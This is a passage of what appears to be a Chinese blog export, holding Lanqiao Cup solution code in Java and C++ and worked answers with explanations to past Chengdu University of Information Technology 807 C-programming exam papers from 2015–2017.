&lt; a.length;j++) &#123;// 后面置0，上一次递归可能改过第n项以后的值 a[j] = 0; &#125; &#125; &#125; private static void print(int a[]) &#123; for (int i = 0;i &lt; a.length;i++) &#123; if (a[i] != 0) &#123; System.out.print(a[i] + " "); &#125; &#125; System.out.println(); &#125;&#125; c++: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;int ans = 0;void print(int a[], int len) &#123; for (int i = 0; i &lt; len; i++) &#123; if (a[i] != 0) &#123; cout &lt;&lt; a[i] &lt;&lt; " "; &#125; &#125; cout &lt;&lt; endl;&#125;void dfs(int a[], int n, int len) &#123;// System.out.println(Arrays.toString(a)); print(a, len); ans++; int nabs = abs(a[n - 1] - a[n - 2]); for (int i = 1; i &lt; nabs; i++) &#123; a[n] = i; dfs(a, n + 1, len); for (int j = n; j &lt; len; j++) &#123;// 后面置0，上一次递归可能改过第n项以后的值 a[j] = 0; &#125; &#125;&#125;int main() &#123; int n = 0; cin &gt;&gt; n; if (n &lt;= 1) &#123; cout &lt;&lt; 1 &lt;&lt; endl; return 0; &#125; int a[n]; memset(a, 0, sizeof(int) * n);// 数组初始化0 a[0] = n; // 第一项是n for (int i = 1; i &lt;= n; i++) &#123; a[1] = i;// 第二项有n种 dfs(a, 2, n);// 从第三项开始每一项都跟前两项有关 &#125; cout &lt;&lt; ans % 10000 &lt;&lt; endl; return 0;&#125; 题目10 这个题忘记复制题目了，这个题是贪心算法 解题代码： java: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788package wiki.zimo.exam2019;import java.util.HashSet;import java.util.Scanner;/*** * @author zimo**/public class Demo10 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); Tree ts[] = new Tree[n]; for (int i = 0;i &lt; n;i++) &#123; ts[i] = new Tree(); ts[i].x = input.nextInt(); ts[i].y = input.nextInt(); ts[i].r = input.nextInt(); &#125; int ans = 0; HashSet&lt;Tree&gt; set = new HashSet&lt;&gt;(); for (int i = 0;i &lt; n;i++) &#123; for (int j = i + 1;j &lt; n;j++) &#123; if (judge(ts[i],ts[j])) &#123; if (ts[i].r &gt; ts[j].r) &#123; set.add(ts[i]); &#125; else &#123; set.add(ts[j]); &#125; &#125; else &#123; set.add(ts[i]); set.add(ts[j]); &#125; &#125; &#125; for (Tree t : set) &#123; ans += t.r; &#125; System.out.println(ans); &#125; private static boolean judge(Tree t1, Tree t2) &#123; double x = t1.x - t2.x; double y = t1.y - t2.y; double dis = Math.sqrt(x * x + y * y); return dis &lt; t1.r + t2.r; &#125; static class Tree&#123; int x; int y; int r; @Override public int hashCode() &#123; final int prime = 31; int result = 1; result = prime * result + r; result = prime * result + x; result = prime * result + y; return result; &#125; @Override public boolean equals(Object obj) &#123; Tree other = (Tree) obj; if (r != other.r) return false; if (x != other.x) return false; if (y != other.y) return false; return true; &#125; @Override public String toString() &#123; return "Tree [x=" + x + ", y=" + y + ", r=" + r + "]"; &#125; &#125;&#125; c++: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;#include &lt;sstream&gt;#include &lt;cmath&gt;#include &lt;set&gt;using namespace std;class Tree &#123;public: int x; int y; int r; bool equals(Tree obj) &#123; Tree other = obj; if (r != other.r) return false; if (x != other.x) return false; if (y != other.y) return false; return true; &#125; string toString() &#123; stringstream s1; s1 &lt;&lt; "Tree [x=" &lt;&lt; x &lt;&lt; ", y=" &lt;&lt; y &lt;&lt; ", r=" &lt;&lt; r &lt;&lt; "]"; return s1.str(); &#125;&#125;;struct TreeFunctor &#123; bool operator()(const Tree &amp;left, const Tree &amp;right) &#123; return (left.x &lt; right.x); &#125;&#125;; bool judge(Tree t1, Tree t2) &#123; double x = t1.x - t2.x; double y = t1.y - t2.y; double dis = sqrt(x * x + y * y); return dis &lt; t1.r + t2.r; &#125; int main() &#123; int n = 0; cin &gt;&gt; n; Tree ts[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; ts[i].x &gt;&gt; ts[i].y &gt;&gt; ts[i].r; &#125; int ans = 0; set&lt;Tree,TreeFunctor&gt; se; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; if (judge(ts[i], ts[j])) &#123; if (ts[i].r &gt; ts[j].r) &#123; se.insert(ts[i]); &#125; else &#123; se.insert(ts[j]); &#125; &#125; else &#123; se.insert(ts[i]); se.insert(ts[j]); &#125; &#125; &#125; set&lt;Tree,TreeFunctor&gt;::iterator it; for (it = se.begin(); it != se.end(); it++) &#123; ans += (*it).r; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0; &#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>蓝桥杯</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2017年真题答案以及解析]]></title>
    <url>%2Fposts%2F20a2677f%2F</url>
    <content type="text"><![CDATA[单项选择题 C语言程序基本结构单位是A.过程B.变量C.函数D.类答案：C解析：函数是C程序的基本组成单位 若用数组名作为函数调用时的实参，则实际上传递给形参的是A.数组首地址B.数组的任意一个元素值C.数组中全部元素的值D.数组元素的个数答案：A解析：数组名几乎在所有使用到情况下都是该数组的首地址 C语言中基本数据类型包括A.整型、实型、逻辑型、嵌套型.B.整型、字符型、逻辑型、自定义型C.整型、实型、逻辑型、字符型、智能型D.整型、实型、字符型答案：D解析：第很多次强调了，C语言基本数据类型两个空写整型和实型，三个空写整型、实型、字符型，其中实型也叫做浮点型 为表示关系x大于等于y，且y大于等于z，应使用C语言表达式A. (x&gt;=y)&amp;&amp;(y&gt;=z)B. (x&gt;=y)AND(y&gt;=z)C. (x&gt;=y&gt;=z)D. (x&gt;=y)&amp;(y&gt;=z)答案：A解析：B选项，C语言没有AND这个所谓的操作符；C选项，连用关系表达式将从左到右结合，结果是(x &gt;= y)结果是0（假）或者1（真），然后0或者1再和z比大小，结果同样是0或者1；D选项，先比较大小过后的结果做&amp;（按位与）运算 表示字符串结束的转义字符是A.’\a’B.’\t’C.’\n’D.’\0’答案：D解析：’\0’代表字符串结尾，其实这个值是0，另外还有一个0值也值得注意，那就是NULL，代表空指针，这个值同样是0，拓展，所有逻辑运算，如果为真值是1，如果为假，值是0 若一个单向链表中的结点含有两个域，其中data是指向字符串的指针，next是指向结点的指针域，则结点结构类型定义正确的是A. struct link { char *data; struct link *next;};B. struct link { char data; struct link *nex;};C. struct link { char *data;struct link next;};D. struct link { char data; struct link next;};答案：A解析：指向字符串的指针其实就是字符指针，所以使用char *变量标识符来定义，结构体变量应该使用struct 结构体名称 变量标识符定义，而指向结点类型的指针应该使用struct 结构体名称 *变量标识符定义，简记：struct 结构体名称，代表结构体类型，就像int 代表整型一样 下面哪个运算符不是关系运算符A. ==B. &gt;=C. =D. &lt;=答案：C解析：=在C语言中是赋值运算符 若有定义: int a=3;，执行语句a+=a-=aa;后，a的值为A. 3B. -12C. 5D. 4答案：B解析：把这个语句拆开，可以等价为`a=a - aa;a=a+a`;第一句执行完成之后a=-6，第二句执行完成之后a=-12 以下对数组x实行初始化的正确操作是A. int x[]={1,2,3,4};B. int x={1,2,3,4};C. int x[3]={1,2,3,4};D. int x[4]=1,2,3,4;答案：A解析：定义数组时，如果给了初始化列表，则可以不写数组的大小，编译器会自动计算数组的大小，并进行对应元素的赋值操作，所以A正确；B选项纯粹瞎写，定义的是整型变量，还给了一个初始化列表，不合法；C选项，如果给出了数组的大小，那么初始化列表中给出的数据项个数不能超过数组的大小，否则编译失败，但是可以小于数据的大小，并且同时不能小于1个，缺少的部分，编译器自动补0；D选项，给出的不是初始化列表； C语言规定，决定函数返回值类型的是A. return 语句中的表达式类型B. 调用该函数时的主调函数类型C. 调用该函数时的形参类型D. 在定义该函数时所指定的函数类型答案：D解析：函数三要素，函数名，参数，返回值类型；其中返回值类型决定函数的返回值类型； 判断题 一个C程序中，main函数的位置必须在源程序开始处答案：×解析：C程序中，main函数可以出现在任何位置，前提是不写在其他声明或者其他函数内部 可以在赋值语句中通过赋值运算符“=”对字符数组整体赋值。答案：×解析：在定义的时候初始化，就可以在赋值语句中利用”=”运算符直接对字符数组“整体”赋值，注意我打了引号，这里本质上其实是逐个赋值，只是编译器帮你做了优化，让你可以简化赋值的方式，而不需要写循环语句，整体赋值在任何情况下都是不允许的 在C语言中，数组元素的下标是从1开始的答案：×解析：纯属胡说八道，C语言中，数组元素的下标永远是从0开始的 在do-while (表达式)结构的循环中，当表达式的值为0时循环体至少执行一次答案：√解析：do-while循环一开始就会执行一次，然后才会判断表达式的值是否为0，为0就不执行了，为1继续执行循环体，所以do-while循环至少执行一次，这是与其他循环语句不同的地方 对C语言程序进行编译时，可以找出程序的语法错误和注释中的拼写错误答案：×解析：编译时可以找出语法错误是正确的，但是对于注释，编译器是忽略的，也就是说编译器看都不会看注释里面的内容，更不可能检查出注释里面的拼写错误 break语句仅能在switch语句中使用答案：×解析：break语句可以在循环语句或者switch语句中使用，而continue语句只能在循环语句中使用 在C语言中，数组名代表数组中下标为0的元素的值答案：×解析：数组名代表数组首地址，不代表下标为0的元素的值 C语言允许程序员自己建立由不同类型数据组成的组合型的数据结构,称为结构体答案：√ 在C语言中，字符串是用单引号括起来的零到多个字符答案：×解析：字符串是用双引号括起来的零到多个字符 C语言中数组名是一个地址常量，表示数组在内存中的起始地址答案：√解析：数组名是一个地址常量（所以不能作为左值，拓展一下左值，放在赋值运算符左边的值），表示数组在内存中的起始地址，起始地址就是首地址的意思 程序分析题 描述程序主要功能，写出程序运行结果12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; int a,b,c,temp; printf("Please input 3 integers:\n"); scanf("%d%d%d",&amp;a,&amp;b,&amp;c); if (a &lt; b) &#123; temp = a; a = b; b = temp; &#125; if (a &lt; c) printf("%d %d %d",c,a,b); else if (c &gt; b) printf("%d %d %d",a,c,b); else printf("%d %d %d",a,b,c); return 0; &#125; 程序运行时，从键盘输入三个数据56 67 48答案： 功能：输入三个整数，按降序输出 输出结果：67 56 48 描述程序主要功能，写出程序运行结果1234567891011121314#include&lt;stdio.h&gt;struct student&#123; char name[20]; float score1; float score2;&#125;;void main()&#123; struct student a[2]=&#123;&#123;"Zhangwei",100,70&#125;,&#123;"Wangfeng",70,80&#125;&#125;,*p; p = a; printf("name: %s total=%f\n",p-&gt;name,p-&gt;score1+p-&gt;score2); printf("name: %s total=%f\n",a[1].name,a[1].score1+a[1].score2);&#125; 答案： 功能：输出结构体数组a中每个元素的name（名字）和total（总分） 输出结果：12name: Zhangwei total=170.000000name: Wangfeng total=150.000000 描述程序主要功能，写出程序运行结果1234567891011121314151617181920#include&lt;stdio.h&gt;int main()&#123; int i,j,a[3][5],max,m,n; printf("Please input 15 integers:\n"); for (i = 0;i &lt; 3;i++) for (j = 0;j &lt; 5;j++) scanf("%d",&amp;a[i][j]); max = a[0][0]; for (i = 0;i &lt; 3;i++) for (j = 0;j &lt; 5;j++) if (max &lt; a[i][j]) &#123; max = a[i][j]; m = i; n = j; &#125; printf("a[%d][%d]=%d\n",m,n,max); return 0;&#125; 程序运行时，输入45 67 32 46 77 65 34 23 84 71 83 92 34 51 48 答案： 功能：输出输入的15个数字中的最大值，以及最大值对应数组中的下标 输出结果：a[2][1]=92 程序设计题 输入一行字符，分别统计出其中英文字母、空格、数字和其它字符的个数，以回车表示输入结束，最后在屏幕上显示统计结果答案： 1234567891011121314151617181920#include&lt;stdio.h&gt;int main()&#123; int letter,space,number,other; char ch; letter = space = number = other = 0; printf("Please input strings:\n"); do&#123; ch = getchar(); if ((ch &gt;= 'a' &amp;&amp; ch &lt;= 'z') || (ch &gt;= 'A' &amp;&amp; ch &lt;= 'Z')) letter++; else if (ch == ' ') space++; else if (ch &gt;= '0' &amp;&amp; ch &lt;= '9') number++; else other++; &#125;while(ch != '\n'); printf("letter:%d,space:%d,number:%d,other:%d\n",letter,space,number,other); return 0;&#125; 观察并发现下面图形的规律，使用循环语句编写程序，输出该图形 1234567* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 答案： 1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;#define N 7#define M 3void printOneLine(int n)&#123; int i = 0; for (;i &lt; n;i++) &#123; printf("* "); &#125; printf("\n");&#125;int main()&#123; int i,j; for (i = 0;i &lt; N;i++) &#123; for (j = 0;j &lt; i * M;j++) &#123; printf(" "); &#125; printOneLine(N); &#125; return 0;&#125; 编写程序，输入下列学生成绩表中的数据，采用结构体数组存放，输出平均分最高的学生的所有信息 name语文数学外语 zhao97.569.078.0 qian80.093.087.5 sun75.089.568.5 li72.568.554.0 答案： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include&lt;stdio.h&gt;#define N 4struct student&#123; char name[20]; float chinese; float math; float english; float average;&#125;;void input(struct student *s)&#123; printf("Please input name:"); scanf("%s",s-&gt;name); printf("Please input chinese score:"); scanf("%f",&amp;s-&gt;chinese); printf("Please input math score:"); scanf("%f",&amp;s-&gt;math); printf("Please input english score:"); scanf("%f",&amp;s-&gt;english); float sum = s-&gt;chinese + s-&gt;english + s-&gt;math; s-&gt;average = sum / 3;&#125;struct student* findMax(const struct student *a,int n)&#123; struct student *max = a; int i = 0; for (;i &lt; n;i++) &#123; if (max-&gt;average &lt; (a + i)-&gt;average) &#123; max = a + i; &#125; &#125; return max;&#125;void print(const struct student *a)&#123; printf("name:%s,chinese:%.2f,math:%.2f,english:%.2f,average:%.2f\n",a-&gt;name,a-&gt;chinese,a-&gt;math,a-&gt;english,a-&gt;average);&#125;int main()&#123; struct student a[N],*max; int i,n; printf("Please input n(integer,no more than %d):",N); scanf("%d",&amp;n); getchar(); for (i = 0;i &lt; n;i++) &#123; printf("Please input No.%d student information:\n",i + 1); input(&amp;a[i]); &#125; max = findMax(a,n); printf("The information of the student who has the highest average score as follow.\n"); print(max); return 0;&#125;]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2016年真题答案以及解析]]></title>
    <url>%2Fposts%2F21179a62%2F</url>
    <content type="text"><![CDATA[单项选择题 下面不正确的字符串常量是A. ‘abc’B. “1212”C. “0”D. “ “答案：A解析：字符串常量应该由双引号括起来 判断char型变量ch是否为大写字母的正确表达式是A. ‘A’ &lt;= ch &lt;= ‘Z’B. (ch&gt;=’A’) &amp; (ch&lt;=’Z’)C. (ch&gt;=’A) &amp;&amp; (ch&lt;=’Z’)D. (‘A’ &lt;= ch) AND (‘Z’ &gt;= ch)答案：C解析：A选项连用关系运算符将导致不同的含义；B选项&amp;代表位运算，按位与；D选项范围和AND是错误的 若有说明: int a[][3]={1,2,3,4,5,6};，则a数组第一维的大小是A. 2B. 3C. 4D. 无确定值答案：A解析：初始化列表中给出了六个元素，而数组声明中给了第二维的大小是3，所以前三个初始化第一行，后三个初始化第二行，总共两行，于是选A，如果语句改为int a[][3]={1,2,3,4,5,6,7};，那么将会声明出一个3x3的数组，第一行值为1,2,3，第二行值为4,5,6，第三行值为7,0,0 下列可作为C语言赋值语句的是A. x = 3,y = 5;B. a = b = 6C. i--;D. y = int(x);答案：A解析：B选项错在没有分号，不能算作语句，另外只有已经声明过的变量才可以连续赋值，变量在声明时不能连续赋值；C选项，++、--不算做赋值运算；D选项错在强制类型转换 C语言中，while和do-while循环的主要区别是A. do-while 的循环体至少无条件执行一次B. while 的循环控制条件比do-while的循环控制条件更严格C. do-while 允许从外部转到循环体内D. do-while 的循环体不能是复合语句答案：A解析：此题考查do-while和while循环的区别，答案显而易见是A；B选项纯粹胡扯；C选项，goto语句可以跳到打了标记的任何位置，跟循环体没有关系；D选项纯属胡扯 若有语句: int a[5],p=a; ，则对a数组元素首地址的正确引用是A. &amp;p+5B. **a+1C. &amp;*a+3D. \(a+0)答案：D解析：A选项指向数组最后一个元素的后一个位置；B选项非法；C选项指向a[3]位置，D选项需要理解一下a数组元素首地址的正确引用这个概念了，地址的引用，其实就是该地址存放的那个变量名，所以这题目就是在问哪个选项能够表示a[0]，emmm，感觉有点强行解释 若有语句: int pl,m;，以下为正确赋值语句的选项是A. pl = m;B. pl = &m;C. pl = *m;D. pl = &amp;m;答案：B解析：给指针变量赋值需用&amp;变量名 说明一个结构体变量时，系统分配给它的内存是A.各成员所需内存量的总和B.结构中第一个成员所需内存量C.成员中占内存最大者所需的容量D.结构中最后一个成员所需内存量答案：A解析：参考书上是这么讲的；但是实际上，这里会有内存对齐的坑，但是不考所以可忽略，但是做学术的人呢，还是有必要了解一下的，所以关于内存对齐的内容留给各位自行拓展 以下正确的函数形式是A. double fun(int x, int y){ z=x+y; return z;}B. fun(int x, y){ int z;return z;}C. fun(x, y){ int x, y; double z;z=x+y;return z;}D. double fun(int x, int y){ double z;z=x+y;return 2;}答案：D解析：A选项错在变量z没有定义；B选项错误有点多，函数没有返回值类型、形参的定义搞成了变量的定义；C选项简直就是胡拼乱凑 C程序一定会有的函数是A. mianB. mainC. printfD. scanf答案：B解析：main函数是C程序的入口，必须有 判断题 for循环的三个表达式可以任意省略，while, do-while 中的表达式也是如此答案：×解析：有关for语句的说法是对的，其他的是错误的 一个C语言源程序文件中主函数有且仅有一个答案：√解析：说法正确，但是如果在一个工程中，可能存在多个源程序文件，这时候只能有一个源程序文件中有main函数，有且仅有一个 二维数组可以这样定义: int a[3,4]答案：×解析：正确的写法应该是int a[3][4] C语言的应用比较广泛，不仅可用来编写应用软件，而且可用来编写系统软件答案：√解析：Linux操作系统中的应用软件都是使用C语言编写的，操作系统的内核部分大部分是由C/C++编写的，因此具有很高的性能 函数必须有参数答案：×解析：函数可以无参，通常main函数是无参的，但是main函数也可以带有参数 结构体成员的类型必须是基本数据类型答案：×解析：通常，结构体的成员的类型是基本数据类型，但是结构体的成员可以是其他类型，比如指针类型，如链表，结构体的成员还可以是另一个结构体类型 判断一个变量是否为“真”时，以0代表“假”，以非零代表“真”答案：√解析：说法正确，拓展，一个逻辑（关系）表达式的结果只有两种，1代表真，0代表假，如3 &gt; 2这个表达式的结果是1，代表真 内存中的每个存储单元都有一个唯一的地址答案：√解析：地址分为两类，一类是逻辑地址，另一个类是物理地址，内存中每个存储单元都有一个唯一的地址，这里的地址指物理地址，唯一，所以说法正确 假设有char a[10]=”abc”;，则strlen(a)的值为3答案：√解析：strlen函数返回字符串的长度，不包括末尾的’\0’ continue不是结束本次循环，而是终止整个循环的执行答案：×解析：break，跳出循环，即终止本层循环的执行；continue只是结束本次循环 程序分析题 描述程序的主要功能，并写出程序的运行结果1234567891011121314151617#include&lt;stdio.h&gt;int main()&#123; int a,b,result; char op; scanf("%d%c%d",&amp;a,&amp;op,&amp;b); switch(op) &#123; case '+':result = a + b;break; case '-':result = a - b;break; case '*':result = a * b;break; case '/':if (b != 0) result = a / b;break; default:result = 0; &#125; printf("%d %c %d = %d",a,op,b,result); return 0;&#125; 输入数据： 12+120 60/3 答案： 功能：对输入的整数四则运算式进行运算并输出，其中如果除数为0，或者运算符不是加减乘除，则运算结果为0 输出结果： 12 + 120 = 132 60 / 3 = 20 描述程序的主要功能，并写出程序的运行结果12345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int n,i,j,num[20],tmp; printf("Please input n:"); scanf("%d",&amp;n); printf("Please input %d num:",n); for (i = 0;i &lt; n;i++) scanf("%d",&amp;num[i]); for (i = 0;i &lt; n;i++) for (j = 0;j &lt; n - 1;j++) if (num[j] &gt; num[j + 1]) &#123; tmp = num[j]; num[j] = num[j + 1]; num[j + 1] = tmp; &#125; printf("Output:"); for (i = 0;i &lt; n;i++) printf("%d ",num[i]); return 0;&#125; Please inputn: 10Please input 10 num: 49 32 61 97 76 13 27 38 55 86Output: 答案： 功能：输入一个不超过20的数字n作为数组的大小，然后输入n个数字，对这组数字进行冒泡排序，最后升序输出 运行结果：13 27 32 38 49 55 61 76 86 97 描述程序的主要功能，并写出程序的运行结果（这题有错，我修改了一下代码）123456789101112131415161718#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; int i = 0; char str[100]; printf("Please input string:"); gets(str); while (str[i] != '\0') &#123; if (('a' &lt;= str[i]) &amp;&amp; (str[i] &lt;= 'z')) str[i] = str[i] - 'a' + 'A'; i++; &#125; printf("Output:"); puts(str); return 0;&#125; 程序输入:Please input string: Introduction of C++ LanguageOutput: 答案： 功能：输入一个不超过100个字符的字符串，将该字符串中所有小写字母转换为大写字母后输出 运行结果：Output:INTRODUCTION OF C++ LANGUAGE 程序设计题 从键盘输入一个整数的百分制成绩，用变量score存储，如果score不在0-100范围内，则输出”Error Input!”,并结束程序。否则，将输入的数据转换成等级’A’，’B’, ‘C, ‘D’,’E’。 90分以上为’A’，8089分为’B’，7079分为’C’，60~69分为’D’，60分以下为E’，结果赋值给变量grade，并将变量score 和grade的值输出到屏幕上答案： 1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int score = 0,grade = 0; printf("Please input score:"); scanf("%d",&amp;score); if (score &lt; 0 || score &gt; 100) &#123; printf("Error input!\n"); exit(0); &#125; int tmp = score / 10; switch(tmp) &#123; case 10: case 9:grade = 'A';break; case 8:grade = 'B';break; case 7:grade = 'C';break; case 6:grade = 'D';break; default:grade = 'E'; &#125; printf("Output:"); printf("score:%d\tgrade:%c",score,grade); return 0;&#125; 从键盘输入一个可带空格的字符串，判断该字符串是否是回文(回文指正向读与逆向读相同的字符串，如abcddcba或abcba等)。如果字符串是回文，输出”Yes”， 否则输出”No”答案： 12345678910111213141516171819202122#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main()&#123; int i,len; char str[100]; printf("Please input string:"); gets(str); len = strlen(str); printf("Output:"); for (i = 0;i &lt; len;i++) &#123; if (str[i] != str[len - i - 1]) &#123; printf("No\n"); exit(0); &#125; &#125; printf("Yes\n"); return 0;&#125; 从键盘上输入矩阵的阶数n(n&lt;5),再输入矩阵的各个数据元素，计算阵的对角线元素之和sum。按照下面格式输出该矩阵和sum的值例如n=3时，矩阵为:1 3 63 6 96 9 12sum = 19答案： 12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;#define N 5int main()&#123; int n,i,j,sum = 0; int a[N][N]; printf("Please input n:"); scanf("%d",&amp;n); printf("Please input array a[%d][%d] , total %d integers:\n",n,n,n*n); for (i = 0;i &lt; n;i++) &#123; for (j = 0;j &lt; n;j++) &#123; scanf("%d",&amp;a[i][j]); if (i == j) &#123; sum += a[i][j]; &#125; &#125; &#125; printf("Output:\n"); for (i = 0;i &lt; n;i++) &#123; for (j = 0;j &lt; n;j++) &#123; printf("%d ",a[i][j]); &#125; printf("\n"); &#125; printf("sum = %d",sum); return 0;&#125;]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2015年真题答案以及解析]]></title>
    <url>%2Fposts%2F23c99d45%2F</url>
    <content type="text"><![CDATA[填空题 已知x为整数，x等于5，则表达式x%2的值是__答案：1；解析：5对2取模运算，值为1 文本文件(文件名为test1.txt)和二进制文件(文件名为test2.dat)。能用Windows的记事本将该文件内容显示在屏幕上的文件是__答案：test1.txt；解析：记事本只能正常打开文本文件，如果强行打开二进制文件，会乱码 下面程序中，主函数调用了FindMax函数，找出数组中的最天值 123456789101112131415161718192021222324#include&lt;stdio.h&gt;#define N 3#define M 4______void main()&#123; int x[N][M] = &#123;1,5,7,4,2,6,4,3,8,2,3,1&#125;; int max; ______ printf("The max value is %d\n",max);&#125;int FindMax(int x[N][M])&#123; int i,j; int max; max = x[0][0]; for (i = 0;i &lt; N;i++) &#123; for (j = 0;j &lt; M;j++) if (max &lt; x[i][j]) max = x[i][j]; &#125; ______&#125; 答案： int FindMax(int x[N][M]); max = FindMax(x); return max; 解析： 主函数里面要调用函数，需要在之前对函数进行声明，所以直接把下面函数定义的函数头拿过来，然后后面加上分号即可，如果函数定义在主函数之前，则可以不必声明。 下一行在输出max，不难想到，这里是对max进行赋值，即调用FindMax函数，然后把返回值赋值给max 可以看到FindMax已经把主体功能完成了，即把最大值通过打桩的算法存放在了max变量中，但是这个函数缺少返回值，于是答案就很明显了 下面程序的功能是:输出字符数组a中下标为偶数的元素 123456789101112#include&lt;stdio.h&gt;#include&lt;string.h&gt;void main()&#123; char a[] = "clanguage"; int i,k; k = strlen(a); puts(a); for (i = 0;i &lt; k;i += 2) ______ printf("\n");&#125; 答案：printf(&quot;%c&quot;,a[i]); 解析：for循环已经帮我们控制好了条件，所以只需要挨个输出字符就好，注意：这里如果填putchar(a[i]);也是正确的 C语言中基本数据类型包括整型、实型、__答案：字符型 语句块t=a;a=b;b=t;的功能是__答案：交换变量a、b的值；解析：经典的变量交换方法 以下程序功能是:已知第1人是10岁，第2人比第1人大2岁，第3人比第2人大2岁，以此类推，求第n个人的年龄，请按题意要求填空完善程序 1234567891011121314#include&lt;stdio.h&gt;int age(int n)&#123; int c; if (n == 1) c = 10; ______ return c;&#125;void main()&#123; int n; scanf("%d",&amp;n); printf("%d\n",______);&#125; 答案： c = 2 + age(n - 1); age(n) 解析： 此题明显是递归，因为题目给出了一个递推关系，即第n个人的年龄=第n-1个人的年龄+2和一个出口条件，即第一个人的年龄是10；根据这种递推关系，我们可以很轻松的写出简洁的代码，按题意很显然n是正整数，但此题有问题（不严谨），如果用户输入的n &lt; 1那么就会进入死递归，所以我把答案修改了一下，变成c = n &lt;= 0 ? 10 : 2 + age(n - 1);另外，还可以利用数学归纳法（本质上此题是一个等差数列求第n项）解此题 123456第 1 个人的年龄 = 10第 2 个人的年龄 = 第 1 个人年龄 + 2 = 12 = 10 + 2 * 1 第 3 个人的年龄 = 第 2 个人年龄 + 2 = 14 = 10 + 2 * 2...第 n 个人的年龄 = 10 + 2 * (n - 1)于是答案为：c = 10 + 2 * (n - 1); 输出函数返回的结果即可算出第n个人的年龄 若有以下定义和语句char *s1=&quot;12345&quot;， *s2=&quot;1234&quot;;printf(&quot;%d\n&quot;, strlen(strcpy(s1,s2));则输出结果是__答案：运行错误，尝试修改字符串常量地址区解析：char *s1 = “xxx”;代表声明一个字符指针，这个指针指向地址中的常量单元也就是不可修改的单元，这一片单元中所存放的内容是“xxx\0”，不过虽然内存中的值不能修改，但是可以修改s1指针的指向，这个就是和字符数组最大的区别，前者可以修改指向，不能修改内存中的内容，后者不能修改指向，但可以修改内存中的内容 以下程序的运行结果是__ 123456789101112#include&lt;stdio.h&gt;struct stu_score&#123; char c_language; char math; char english;&#125;;int main()&#123; struct stu_score student; printf("%d\n",sizeof(student)); return 0;&#125; 答案：3；解析：结构体类型所占用的空间是结构体成员所占用空间之和，所以这个题是三个char类型变量所占用的空间加起来，结果是3 程序改错题 以下程序功能是将分配的内存地址输出 1234567891011121314151617#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; /*********Found (1) ***********/ char p_str[2]; /*********Found (2) ***********/ if (p_str = (char*)malloc(100)==NULL) &#123; printf("malloc memory fail!\n"); return 1; &#125; printf("%o\n",p_str); /*********Found (3) ***********/ close(p_str); return 0;&#125; 答案： char *p_str; if ((p_str = (char*)malloc(100))==NULL) free(p_str); 解析： 数组名是指针常量，修改指针常量的指向是非法的，所以应该改为字符指针 赋值运算符的优先级很低，如果不加括号改变优先级的话，结果将会是先运算(char*)malloc(100)==NULL这个表达式，这是个逻辑表达式，值只可能是0或者1，然后再将这个运算好的结果赋值给p_str字符指针，显然是不合法的 malloc函数申请的地址在程序运行结束之前应当交给系统回收，对应的函数是free，而不是close 从一个子函数中输入结构体信息并在主函数中输出 12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;struct person&#123; int a; double b;&#125;;/*********Found (4) ***********/void input(struct person x);int main()&#123; struct person y; /*********Found (5) ***********/ input(y); printf("%d %f\n",y.a,y.b); return 0;&#125;/*********Found (6) ***********/void input(struct person x)&#123; char tmp[10]; printf("请输入整型数a："); gets(tmp); x-&gt;a=atoi(tmp); printf("请输入单精度数b："); gets(tmp); x-&gt;b=atof(tmp);&#125; 答案： void input(struct person *x); input(&amp;y); void input(struct person *x) 解析： 在不同的函数中声明的变量叫做局部变量，这些局部变量的有效作用范围只在本函数从声明的地方开始，到本函数结束的地方，于是如果想在其他函数中操作在主函数中声明的某个变量，只能通过传递指针的方式，而函数调用中，有两个比较关键的概念，形参和实参，形参是函数声明里面的变量，而实参是函数调用中实际传递变量或者常量，所以这里形参的参数应该是指针类型，调用的时候传递过去的实参应该是一个地址类型的值 由上一个解析可知，调用的时候应当传递地址值 -&gt;操作符只能是指针类型使用，所以形参应当是一个指针 程序功能:计算1/1+ 1/2+…+ I/N之和并显示 123456789101112131415#include&lt;stdio.h&gt;#define N 2int main()&#123; /*********Found (7) ***********/ int result = 0; int fac; for (fac = 1;fac &lt;= N;fac++) &#123; /*********Found (8) ***********/ result += 1.0/2; &#125; printf("%8.6f\n",result); return 0;&#125; 答案： float result = 0.0; result += 1.0/fac; 解析： 此题明显是计算调和级数之和，而调和级数除了第一项是1之外，每一项都是小于1的浮点数，所以调和级数之和应该保存在浮点型变量中，另外，输出语句使用%8.6f也暗示了这一点 result += 